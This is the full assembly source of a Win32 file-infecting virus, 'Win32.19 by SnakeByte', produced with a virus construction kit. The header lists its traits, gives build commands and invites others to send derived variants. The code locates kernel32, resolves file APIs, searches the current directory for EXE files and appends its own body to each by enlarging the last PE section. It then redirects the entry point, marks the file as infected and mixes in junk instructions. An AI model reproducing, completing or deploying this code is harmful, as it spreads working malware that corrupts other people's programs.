              
;
;
; Win32.19 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.19
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 19
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 9
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ebx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
                                        ; mov ebp, ebx
                                        ; clear ebp
 and ebp, 0
 add ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:
 OldEIP      dd 0h
 AlignReg1   dd 0h

 APINames:
 db 18d, 'GetFileAttributesA'
 db 18d, 'SetFileAttributesA'
 db 13d, 'FindNextFileA'
 db 11d, 'CreateFileA'
 db 14d, 'FindFirstFileA'
 db 18d, 'CreateFileMappingA'
 db 11d, 'CloseHandle'
 db 13d, 'MapViewOfFile'
 db 09d, 'FindClose'
 db 15d, 'UnmapViewOfFile'

 filemask    db '*.eXe',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 KernelMZ    dd 0h
 Trash2      dd 0h
 TempAPI     dd 0h
 AlignTemp   dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h

 MapHandle   dd 0h
 counter     dw 0h
 InfCounter  dd 0h
 Trash1      dd 0h
 Attributes  dd 0h
 NTableTemp  dd 0h
 AlignReg2   dd 0h
 TempApisearch2 dd 0h
 KernelPE    dd 0h
 db 'Win32.19 - SnakeByte',0
 ATableVA    dd 0h
 FileHandle  dd 0h
 NewSize     dd 0h
 NewEIP      dd 0h
 OTableVA    dd 0h
 OldBase     dd 400000h
 NTableVA    dd 0h
 MapAddress  dd 0h
 FindHandle  dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; retrieve PE - Header
 mov ebx, eax
 add ebx, [eax+3Ch]
                                        ; get File Alignment
 mov eax, [ebx+3Ch]
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 8d )
 xor ecx, 8d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], -1
 sal ebx, 22d                           ; Trash
 and dword ptr [ebp+AlignReg2], eax
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
                                        ; mov ecx, -1
 mov ecx, ( -1d - 4d )
 add ecx, 4d
 and ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
                                        ; clear esi
 push 0
 pop esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infect by increasing the last section
 push ecx
 mov ebx, eax                           ; Trash
 pop esi
                                        ; get last section
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
                                        ; add ecx, 120
 add ecx, 120d
 add ecx, edx
 mov ebx, dword ptr [esi+74h]
 sal ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], ebx
 mov ebx, dword ptr [esi+34h]
 push ebx
 pop dword ptr [ebp+OldBase]
                                        ; clear ebx
 and ebx, 0

 add ebx, [ecx+10h]
                                        ; mov edx, ebx
 push ebx
 pop edx
 add ecx, 14h
 add ebx, [ecx]
 sub ecx, 14h
 push ebx
 mov eax, edx
 add eax, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
                                        ; clear eax
 mov eax, 41269d
 sub eax, 41269d

 add eax, [ecx+10h]
 push eax
 add dword ptr [ebp+Trash1], 995807     ; Trash
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; mov eax, -1
 mov eax, ( -1d xor 0d )
 xor eax, 0d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], eax
 pop eax
 add eax,  (VirusSize-1550d)
 add eax, 1550d
 mov dword ptr [ecx+08h], 0
 add dword ptr [ecx+08h], eax
 mov eax, dword ptr [ecx+0Ch]
 add eax, dword ptr [ecx+10h]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '19'
                                        ; Append Virus
 pop edi
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 mov ebx, eax                           ; Trash
 dec eax
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 dec dword ptr [ebp+Trash1]             ; Trash
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop ebx

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ebx

 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 sub ebp, 1
 jz FirstGenHost
 xor ecx, 44906328d                     ; Trash
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 push ecx
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, 276d
 lea edi, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec edx
 jnz ClearOldData2
 and ecx, ebx                           ; Trash
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ecx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg eax, edx

 push eax
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 push ebx
 pop dword ptr [ebp+retEIP]

 shr eax, 22d                           ; Trash
                                        ; clear edx
 mov edx, -64156d
 add edx, 64156d
 add edx, dword ptr [ebp+OldBase]

 and dword ptr [ebp+Trash1], eax        ; Trash
 mov dword ptr [ebp+retBase], edx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov esi, ebp
 rol edx, 24d                           ; Trash
 add esi, offset filemask

                                        ; Set Infection Counter
                                        ; mov edx, 20
 mov edx, ( 20d + 2d )
 sub edx, 2d
 mov dword ptr [ebp+InfCounter], 0
 shl eax, 16d                           ; Trash
 xor dword ptr [ebp+InfCounter], edx
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop eax
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg edx, eax

 push eax
 or edx, eax                            ; Trash
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 mov edx, 128d
 push edx
 lea esi, [ebp+WFD_szFileName]
 xchg edx, esi


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
 mov edx, 3894617d                      ; Trash
                                        ; check for minimum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 sbb eax, 29d                           ; Trash
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; check for ZM
 movzx ebx, word ptr [esi]
 sub ebx, 'ZM'
 jz Goodfile
 jmp Notagoodfile
 mov ebx, 62188554d                     ; Trash

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [esi+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; clear edx
 mov edx, 0
                                        ; add edx, 1
 inc edx
 sub edx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '19'
 jz Notagoodfile
                                        ; check for DLL
 mov ax, word ptr [ecx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [ecx+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 xor eax, 4144055d                      ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 mov eax, ebp
 add eax, offset WFD_szFileName

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 or ebx, ebx                            ; Trash

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 add esp, -4d
 add dword ptr [ebp+Trash1], 949966     ; Trash
                                        ; round to pages
 shr ecx, 16d
 shl ecx, 16d
                                        ; add ecx, 1
 inc ecx
GetKernelLoop:
                                        ; clear ebx
 xor ebx, ebx
 sub ecx, 1
 and dword ptr [ebp+Trash1], ecx        ; Trash
 mov bx, word ptr [ecx+03ch]
 test bx,0f800h
 jnz GetKernelLoop
 cmp ecx, dword ptr [ecx+ebx+34h]
 jnz GetKernelLoop
 push ecx
 pop dword ptr [ebp+KernelMZ]
 mov ebx, ecx
 add ebx, [ecx+3Ch]
 mov [KernelPE+ebp], ebx

 jmp GetApis

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret
 add ebx, 67030653d                     ; Trash


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx
 sal eax, 22d                           ; Trash

                                        ; load API Names and Offsets
 mov esi, ebp
 add esi, offset APIOffsets

 lea ebx, [ebp+APINames]
 xchg ecx, ebx


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear eax
 mov eax, 0
 mov al, byte ptr [ecx]
                                        ; add ecx, 1
 sub ecx, -1d

                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; ecx points to the Name
                                        ; esi points to the offset
 and ebx, ecx                           ; Trash

 call SearchAPI1
 push ecx
 add dword ptr [esp], eax
 pop ecx
 inc ebx                                ; Trash
                                        ; clear edi
 mov edi, -28919d
 add edi, 28919d
 add edi, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], edi
                                        ; add esi, 4
 add esi, 4d
 dec edx
 jnz GetApisLoop
 lea ebx, [ebp+Outbreak]

 push ebx
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; ecx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 mov edi, 4607d
 sub edi, 4607d
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 push 0
 pop edx
 add edx, [edi+78h]
 adc ebx, 46145939d                     ; Trash
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
                                        ; add edx, 4
 add edx, 4d
 mov dword ptr [ebp+ATableVA], edi
 dec dword ptr [ebp+Trash1]             ; Trash
                                        ; get NTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
 and dword ptr [ebp+Trash1], ecx        ; Trash
                                        ; add edx, 4
 inc edx
 add edx, 3d
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 mov ebx, dword ptr [ebp+NTableVA]
 xor dword ptr [ebp+Trash1], 602855     ; Trash


SearchNextApi1:                         ; search for the API's
 inc dword ptr [ebp+Trash1]             ; Trash
 mov dword ptr [ebp+NTableTemp], ebx
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; mov ebx, edx
                                        ; clear ebx
 and ebx, 0
 add ebx, edx
                                        ; mov edi, edx
 mov edi, edx
 push eax
 mov dword ptr [ebp+TempApisearch2], edi
 push ecx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [edi]
 cmp dl, byte ptr [ecx]
 jne ApiNotFound
 sub eax, 1
 or eax, eax
 jz FoundApi1
                                        ; add ecx, 1
 inc ecx
 neg edx                                ; Trash
                                        ; add edi, 1
 add edi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ecx
 pop eax
 push dword ptr [ebp+TempApisearch2]
 pop edi
 push dword ptr [ebp+NTableTemp]
 pop ebx
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
 pop edi
 or ebx, eax                            ; Trash
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, edi
 movzx edx, word ptr [edi]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 adc dword ptr [ebp+Trash1], 623980     ; Trash
 xor dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 xor ebx, ebx

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 push 80000000h or 40000000h
 lea ebx, [ebp+WFD_szFileName]
 xchg eax, ebx

 push eax
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax
 add ebx, edx                           ; Trash

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx

                                        ; clear edx
 mov edx, -29057d
 add edx, 29057d
 push edx
 push ecx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ecx
 sub eax, 1
 add eax, 1
 jz CloseFile
                                        ; clear edx
 push 0
 pop edx
 push ecx
 push edx
 push edx
                                        ; mov ebx, 2
 mov ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+Trash1], ecx        ; Trash
 xor dword ptr [ebp+MapAddress], eax
 clc
ret
 shl edx, 9d                            ; Trash

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 mov dword ptr [ebp+Trash1], 336702     ; Trash
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 sal ebx, 9d                            ; Trash
 push 0h
 call ExitProcess



end FakeCode

